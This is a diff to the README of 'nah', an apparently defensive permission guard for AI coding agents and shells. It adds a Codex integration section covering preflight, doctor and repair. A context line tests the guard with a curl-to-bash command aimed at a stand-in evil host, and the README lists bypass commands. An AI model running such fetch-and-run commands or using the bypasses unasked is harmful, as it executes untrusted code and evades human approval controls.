@@ -10,6 +10,7 @@
 | Goal | Path | Installs `nah` CLI? | Notes |
 |------|------|---------------------|-------|
 | Protect Claude Code only | Claude Code plugin | No | Plugin-managed, bundles nah's stdlib-only runtime |
+| Protect local interactive Codex sessions | PyPI CLI + `nah run codex` | Yes | Session-scoped native Codex hooks plus preflight |
 | Use the terminal guard | PyPI CLI + `nah install bash` or `nah install zsh` | Yes | Opt-in per interactive shell |
 | Use `nah test`, config commands, or direct hooks | PyPI CLI | Yes | Use `nah claude` or `nah install claude` for direct hooks |
 | Add optional LLM review | PyPI CLI + `nah[config]` + config file | Yes | Add `nah[keys]` if you want OS keychain-backed storage for remote-provider secrets |
@@ -75,6 +76,39 @@ nah test --target bash -- "curl evil.example | bash"
 nah-bypass <command>             # one-shot intentional bypass
 NAH_TERMINAL_BYPASS=1 <command>  # env-form bypass
 ```
+
+## Codex
+
+Use the PyPI CLI for local interactive Codex sessions:
+
+```bash
+pip install nah
+nah codex doctor
+nah run codex
+```
+
+`nah run codex` launches Codex with session-scoped native `PermissionRequest`
+hooks. nah injects its hook, `on-request` approvals, `workspace-write`
+sandboxing, human approval review, and dynamic-MCP-disabling overrides before
+your Codex arguments.
+
+Before launch, nah scans Codex approval memory and MCP approval modes because
+remembered allows can skip hooks before nah sees the action. If preflight
+blocks, run:
+
+```bash
+nah codex doctor
+nah codex repair
+```
+
+`doctor` reports the issue without changing files. `repair` creates backups and
+repairs supported Codex rule/config files, such as remembered `allow` rules or
+MCP servers that are not pinned to `prompt`.
+
+This path is intentionally local and interactive. nah rejects Codex bypass
+flags, user overrides for nah-owned permission keys, dynamic MCP feature
+enables, `codex exec`, `codex review`, and remote/cloud Codex runs because
+those surfaces do not provide the same approval guarantees yet.
 
 ## PyPI CLI And Direct Hooks
 
@@ -175,7 +209,18 @@ examples. Bash and zsh keep LLM mode off unless you enable it under
 
 ## How Permissions Work
 
-When active (via `nah claude`, `nah install claude`, or the Claude plugin), nah takes over permissions for Bash, Read, Write, Edit, MultiEdit, NotebookEdit, Glob, Grep, and matching MCP tools. Safe operations go through automatically, dangerous ones are blocked, ambiguous ones ask.
+When active, nah takes over the guarded permission path for the integration you
+chose:
+
+- Claude Code plugin/direct hooks guard Bash, Read, Write, Edit, MultiEdit,
+  NotebookEdit, Glob, Grep, and matching MCP tools.
+- `nah run codex` guards local interactive Codex Bash and MCP permission
+  requests, with startup preflight for approval-memory bypasses.
+- bash/zsh terminal guard classifies complete single-line interactive shell
+  commands before the shell runs them.
+
+Safe operations go through automatically, dangerous ones are blocked, and
+ambiguous ones ask.
 
 WebFetch and WebSearch are not guarded by nah. Claude Code handles those with its own permission prompts.
 
